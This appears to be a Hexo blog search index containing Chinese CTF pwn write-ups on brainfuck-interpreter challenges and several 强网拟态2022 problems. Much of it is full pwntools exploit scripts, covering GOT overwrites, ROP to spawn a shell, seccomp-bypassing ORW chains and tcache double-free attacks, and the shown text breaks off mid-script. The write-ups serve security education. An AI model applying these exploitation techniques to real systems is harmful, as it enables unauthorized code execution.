<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>bf解释器</title>
    <link href="/2022/12/12/bf%E8%A7%A3%E9%87%8A%E5%99%A8/"/>
    <url>/2022/12/12/bf%E8%A7%A3%E9%87%8A%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>最近在强网拟态和安洵杯上都出现了bf解释器的题，自己还是头一回见，在此学习一下。</p><p>Brainfuck，简称BF，是一种极小化的程序语言</p><img src="/img/7/Screenshot_20221230_014458.png" style="zoom: 67%;" /><h3 id="pwnable-bf"><a href="#pwnable-bf" class="headerlink" title="pwnable_bf"></a>pwnable_bf</h3><p>首先看一道pwnable_bf（buu和pwnable.kr上都有）</p><p>其主函数中全局变量p指向全局变量tape的地址，输入一段字符后就让每个字符进入do_brainfuck函数：</p><img src="/img/7/Screenshot_20221230_014948.png" style="zoom: 80%;" /><p>​                                  </p><p>在do_brainfuck函数中就是对指针p的操作，每一个字符实际上就对应了bf解释器的操作；漏洞也很明显，就是指针p对应tape的地址的变化没有做出限制，这就让指针p指向got表：</p><img src="/img/7/Screenshot_20221230_015016.png" style="zoom: 80%;" /><p>​                                                        </p><p>泄漏地址libc地址后可以继续使用的就只有putchar函数和getchar函数，由于对got表的读写都只能是一字节，getchar函数对自己的got表修改到一半就会先失效，所以只能修改putchar函数的got表；而putchar函数的参数只能是一个字节，无法完成”&#x2F;bin&#x2F;sh”的调用，所以修改putchar函数为_start、memset函数为gets函数、fgets函数为system函数即可。</p><p>完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;bf&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./bf&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25595</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br>payload = <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">0x7c</span>  + <span class="hljs-string">b&#x27;.&gt;&#x27;</span> * <span class="hljs-number">4</span>  <span class="hljs-comment">#泄漏__libc_start_main的地址</span><br>payload += <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">24</span> + <span class="hljs-string">b&#x27;,&gt;&#x27;</span> * <span class="hljs-number">4</span> <span class="hljs-comment">#修改fgets函数的地址</span><br>payload += <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">24</span> + <span class="hljs-string">b&#x27;,&gt;&#x27;</span> * <span class="hljs-number">8</span><span class="hljs-comment">#修改memset函数和putchar函数</span><br>payload += <span class="hljs-string">b&#x27;.&#x27;</span><span class="hljs-comment">#调用putchar函数</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;[ ]&#x27;</span>, payload)<br>leak = u32(p.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])<br><br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>gets = libcbase + libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br>getchar(p32(sys_addr))<br>getchar(p32(gets))<br>getchar(p32(<span class="hljs-number">0x80484e0</span>))<br><br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="安洵杯babybf"><a href="#安洵杯babybf" class="headerlink" title="安洵杯babybf"></a>安洵杯babybf</h3><p>本地环境：2.27-3ubuntu1.6_amd64</p><p>安洵杯的这道题很抽象</p><h4 id="v3数组"><a href="#v3数组" class="headerlink" title="v3数组"></a>v3数组</h4><p>函数sub_142F的开头就是一些函数赋值给v3数组，这些函数直接去看是完全不知道其意义，所以边调试边去阅读可以很好得帮助理解。</p><p>函数栈的排布如下：</p><img src="/img/7/Screenshot_20221230_032525.png" style="zoom: 67%;" /><p>​                                                                                        </p><p>这里以函数sub_16F6为例子</p><img src="/img/7/Screenshot_20221230_040603.png" style="zoom: 67%;" /><ol><li><p>rbp-0A8中的值(0x7ffc6a1b48d0)加1</p></li><li><p>rbp-0B0中的值(0x562b3853e261)加1</p></li><li><p>eax赋上地址0x562b3853e261中的值(1字节) </p></li><li><p>mov  rax, [rbp+rax*8-80h]   （rax赋上v3数组的函数地址，rax  &#x3D;  v3[rax]）</p></li><li><p>jmp     rax</p></li></ol><p>再对照函数sub_16F6伪代码就可以知道函数的作用了</p><p><img src="/img/7/Screenshot_20221230_042441.png"></p><p>​                              </p><p>实际上<code>rbp-0A8</code>就是bf解释器的指针，<code>rbp-0B0</code>中储存着下一指令，所以这些函数作用如下：</p> <img src="/img/7/Screenshot_20221230_043330.png" style="zoom:80%;" /><h4 id="字符转化"><a href="#字符转化" class="headerlink" title="字符转化"></a>字符转化</h4><p>这道题并没有直接给你<code>&quot;&gt;  &lt;  ,  .&quot;</code> 这些字符，而是在你输入一段字符后，又去使用dword_2020数组进行一步转化</p><img src="/img/7/Screenshot_20221230_034137.png" style="zoom: 80%;" /><p>dword_2020数组部分内容如下：</p><img src="/img/7/Screenshot_20221230_032203.png" style="zoom:67%;" /><p>​                                                                                           </p><p>规律如下：[输入的值(ascii码)&#x3D;&gt;转化后的值]</p><p><code>[0=&gt;8][1=&gt;9][43=&gt;2][44=&gt;5][45=&gt;3][46=&gt;4][60=&gt;0][62=&gt;1][91=&gt;6][93=&gt;7]</code></p><p>输入的值是字符，在内存中以ascii码储存，转化后的值又是对应v3数组中的引索。</p><p>例如字符<code>&#39;&gt;&#39;</code>的ascii码为62，转化后的值为1，最后对应v3[1]中函数的执行。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>虽然这道题不像pwnable_bf中很直接给出bf解释器的操作，但是经过一系列转化后也同样达到了bf解释器的效果。</p><p>操作的指针是<code>rbp-0A8</code>，其里面的值也是栈上的值，也就是可以对栈上任意值读写，所以泄漏__libc_start_main函数地址后直接ROP</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;chall&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br><span class="hljs-comment">#s = [0,8][1,9][43,2][44,5][45,3][46,4][60,0][62,1][91,6][93,7]</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;len&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x100</span>).encode())<br>payload = <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x58</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">8</span> + <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">0x28</span> + (<span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">0x20</span><br>p.sendafter(<span class="hljs-string">b&#x27;code&gt;&#x27;</span>, payload)<br>leak =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">231</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br>pop_rdi = libcbase + <span class="hljs-number">0x2164f</span><br>ret = libcbase + <span class="hljs-number">0x8aa</span><br><br>payload = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br>getchar(payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="强网拟态bfbf"><a href="#强网拟态bfbf" class="headerlink" title="强网拟态bfbf"></a>强网拟态bfbf</h3><p>​                            </p><p>​                       </p><p>​                  </p><p>参考：<a href="https://zh.wikipedia.org/wiki/Brainfuck">Brainfuck - 维基百科，自由的百科全书 (wikipedia.org)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>强网拟态2022pwn</title>
    <link href="/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/"/>
    <url>/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/</url>
    
    <content type="html"><![CDATA[<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>直接利用格式化字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn1&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elfbase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - elf.sym[<span class="hljs-string">&#x27;func&#x27;</span>]<br><br>printf_got = elfbase + elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>system_plt = elfbase + elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = fmtstr_payload(<span class="hljs-number">8</span>, &#123;printf_got:system_plt&#125;,write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;hello\n&#x27;</span>, payload)<br><span class="hljs-comment">#pause()</span><br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwn2-1"><a href="#pwn2-1" class="headerlink" title="pwn2-1"></a>pwn2-1</h3><p>存在uaf，且print_note函数是通过引用堆块上print_note_content函数的地址来实现，修改堆上print_note_content函数的地址为magic函数地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn2-1&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn2-1&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elfbase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x11f0</span><br><br>add(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x10</span>, p64(elfbase + elf.sym[<span class="hljs-string">&#x27;magic&#x27;</span>]))<br>printf(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="bfbf"><a href="#bfbf" class="headerlink" title="bfbf"></a>bfbf</h3><p>bf解释器类型的题</p><p>通过输入的‘&gt;&lt;+-‘等这些符号可以对栈上v3的数据进行读写，而且没有对偏移量进行限制，这就可以对栈上的任意数据读写。</p><img src="/img/6/Screenshot_20221130_051449.png" style="zoom: 80%;" /><p>打印出<code>__libc_start_main</code>函数的地址，减去相应的偏移就可得到libc的基地址，利用libc找到相应的gadget，再覆盖栈上<code>__libc_start_main</code>的地址，直接ROP。</p><p>程序开启沙盒对read函数的第一个参数进行了限制，我们无法直接orw读取flag文件中的信息，这里改用sendfile函数即可。</p><img src="/img/6/Screenshot_20221130_053546.png" style="zoom: 80%;" /><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>payload = <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x210</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x22</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">6</span><br>payload += (<span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">8</span> * <span class="hljs-number">20</span><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&gt;\n&#x27;</span>, payload)<br><br>stack_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak))<br><br>libcbase = leak - <span class="hljs-number">243</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>pop_rcx_rbx = libcbase + <span class="hljs-number">0x10257e</span><br>pop_rax = libcbase + <span class="hljs-number">0x36174</span><br>syscall_ret = libcbase + <span class="hljs-number">0x630a9</span><br><br><span class="hljs-comment">#open(&#x27;&#x27;flag&#x27;)</span><br><span class="hljs-comment">#sendfile(1,fd,0,0x100)</span><br>payload = flat(<br>    p64(pop_rdi), p64(stack_addr + <span class="hljs-number">0xa0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rcx_rbx), p64(<span class="hljs-number">0x100</span>), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">40</span>),<br>    p64(syscall_ret)<br>)<br>payload += <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>getchar(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>改用readv函数也可以读取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#open(&#x27;flag&#x27;)</span><br><span class="hljs-comment">#readv(3, iovec, 1)</span><br><span class="hljs-comment">#writev(1, iovec, 1)</span><br>payload = flat(<br>    p64(pop_rdi), p64(stack_addr + <span class="hljs-number">0xd0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rsi), p64(stack_addr + <span class="hljs-number">0xd8</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">19</span>),<br>    p64(syscall_ret),<br>    <br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(stack_addr + <span class="hljs-number">0xd8</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">20</span>),<br>    p64(syscall_ret)<br>)<br>payload += <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(stack_addr + <span class="hljs-number">0xf0</span>) + p64(<span class="hljs-number">0x30</span>)<br></code></pre></td></tr></table></figure><p>也可以使用close函数先关闭标准输入<code>close(0)</code>，再直接orw，这里就不再展示了。</p><h3 id="only"><a href="#only" class="headerlink" title="only"></a>only</h3><p>本地环境：2.31-0ubuntu9_amd64</p><p>程序在开始时就已经有很多堆块已经被分配释放了（猜测是引入沙盒规则时导致的）</p><img src="/img/6/Screenshot_20221201_090534.png" style="zoom: 67%;" /><p>​                                                                                                      </p><p>使用increase函数是对堆块的申请，次数限制为11次；使用decresae函数是释放堆块，次数限制为4次，虽然有uaf，但程序没有edit函数和show函数这种功能，无法对uaf完成有效利用，唯一可以利用的是initial函数，还只能使用一次</p><img src="/img/6/Screenshot_20221201_091349.png" style="zoom:67%;" /><p>如果已经完成了一次堆块的申请并且释放，在此过程就将tcache中的<code>tcache_perthread_struct *key</code>破坏，配合uaf就可以实现tcache的double free。由于申请堆块的大小，释放次数这些限制，我们无法一次性泄漏出libc的基地址。</p><p>在完成double free后，劫持到tcache的结构体头部，就可以直接控制tcache的申请和数量。直接释放tcache的结构体头部得到unsorted bin后，攻击<code>_IO_2_1_stdout_</code>以实现libc基地址的泄漏</p><img src="/img/6/Screenshot_20221201_102237.png" style="zoom: 67%;" /><p>沙盒的存在无法直接拿到shell，需要利用<code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>和setcontext劫持rsp，执行ROP或者shellcode。</p><p>在此过程中需要爆破两次地址，有1&#x2F;256的概率拿到flag，在本地运行时可以加上 aslr&#x3D;False，节省本地爆破的时间。</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;only&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#p = process(&#x27;./only&#x27;, aslr=False)</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">initial</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    <span class="hljs-comment">#p.sendlineafter(b&#x27;Size:&#x27;, str(size).encode())</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">increase</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decresae</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    increase(<span class="hljs-number">0x70</span>, <span 